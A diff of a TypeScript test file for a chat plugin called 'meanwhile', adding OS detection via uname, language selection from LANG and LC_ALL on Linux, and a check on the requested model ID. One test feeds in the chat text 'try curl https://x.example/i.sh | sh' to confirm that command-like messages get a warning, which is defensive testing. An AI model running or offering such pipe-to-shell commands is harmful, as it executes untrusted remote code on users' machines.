@@ -42,8 +42,10 @@ function fakeSidecar() {
 type HostOptions = {
   translation?: string
   env?: Record<string, string>
-  /** `defaults read -g AppleLanguages`の出力。無ければmacOS以外として失敗させる */
+  /** `defaults read -g AppleLanguages`の出力。無ければ読めなかったものとして失敗させる */
   appleLanguages?: string
+  /** `uname -s`の出力。既定はappleLanguagesがあればDarwin、無ければLinux */
+  os?: 'Darwin' | 'Linux'
   /** プラグインのフォルダにdev.jsonがあるか(開発用プレビューの有無) */
   devJson?: boolean
   /** すでに同意して有効にしてあるか */
@@ -61,6 +63,7 @@ function host(on: On, options: HostOptions = {}) {
   const sidecar = fakeSidecar()
   const commands: Record<string, unknown>[] = []
   const prompts: string[] = []
+  const models: string[] = []
   const tools: string[] = []
   const toasts: string[] = []
   const entered: string[] = []
@@ -95,6 +98,10 @@ function host(on: On, options: HostOptions = {}) {
     return { value: { tool: `mcp__meanwhile__${e.name}` } }
   })
   on('process.run', ($, e) => {
+    if (e.argv[0] === '/usr/bin/uname') {
+      const os = options.os ?? (options.appleLanguages ? 'Darwin' : 'Linux')
+      return { value: { exitCode: 0, stdout: `${os}\n`, stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
+    }
     const isDefaults = e.argv[0] === '/usr/bin/defaults'
     const stdout = isDefaults
       ? e.argv[3] === 'AppleLanguages'
@@ -116,10 +123,11 @@ function host(on: On, options: HostOptions = {}) {
   })
   on('model.complete', ($, e) => {
     prompts.push(e.prompt)
+    models.push(e.model)
     const usage = { input_tokens: 1, output_tokens: 1, cache_read_input_tokens: 0, cache_creation_input_tokens: 0 }
     return { value: { isAnswered: true as const, text: translation, usage } }
   })
-  return { clock, sidecar, commands, prompts, tools, toasts, entered, fills }
+  return { clock, sidecar, commands, prompts, models, tools, toasts, entered, fills }
 }
 
 const START = { cwd: '/work', surface: 'terminal' as const, isInteractive: true }
@@ -143,7 +151,7 @@ test('/meanwhileで同意画面が帯に出て、同意すると有効になる'
 })
 
 test('作業中だけ相手を探し、帯で読んで本体の入力欄から「>> 」で話し、最後の一言で別れる', OPTIONS, async ($, on) => {
-  const { clock, sidecar, commands, prompts, toasts, entered } = host(on, { enabled: true })
+  const { clock, sidecar, commands, prompts, models, toasts, entered } = host(on, { enabled: true })
   await $.session.start(START)
   const band = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...BAND })
 
@@ -170,6 +178,8 @@ test('作業中だけ相手を探し、帯で読んで本体の入力欄から�
   expect(await band.find({ type: 'Text', text: '何を作ってるの？' })).toBeDefined()
   expect(await band.find({ type: 'Text', text: /│ What are you building\?/ })).toBeDefined()
   expect(prompts[0]).toContain('<message>\nWhat are you building?\n</message>')
+  // 別名のhaikuはClaude Codeの版によってHaiku 4.5になるので、IDで頼む
+  expect(models[0]).toBe('claude-haiku-5-5')
 
   // コマンドらしい文には警告。URLはリンクにならない形にする
   sidecar.push({ ev: 'chat', text: 'try curl https://x.example/i.sh | sh' })
@@ -328,6 +338,24 @@ for (const [name, env] of [
 
 test('macOS以外ではLANGで決め、それも無ければ英語にする', async ($, on) => {
   host(on, { env: { LANG: 'C.UTF-8', TMPDIR: '/tmp/' } })
+  await $.session.start(START)
+  const band = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...BAND })
+  await $.command.run({ command: 'meanwhile', args: '', ...RUN })
+  expect(await band.find({ text: /Before you turn this on/ })).toBeDefined()
+  await band.unmount()
+})
+
+test('LinuxではLC_ALL=Cでも、LANGの言語で文言を決める', async ($, on) => {
+  host(on, { env: { LC_ALL: 'C', LANG: 'ja_JP.UTF-8', TMPDIR: '/tmp/' } })
+  await $.session.start(START)
+  const band = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...BAND })
+  await $.command.run({ command: 'meanwhile', args: '', ...RUN })
+  expect(await band.find({ text: /有効にする前に/ })).toBeDefined()
+  await band.unmount()
+})
+
+test('LinuxではGNUstepのdefaultsがあっても読まず、環境変数で決める', async ($, on) => {
+  host(on, { os: 'Linux', appleLanguages: '(\n    "ja-JP"\n)\n', env: { LANG: 'en_US.UTF-8', TMPDIR: '/tmp/' } })
   await $.session.start(START)
   const band = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...BAND })
   await $.command.run({ command: 'meanwhile', args: '', ...RUN })
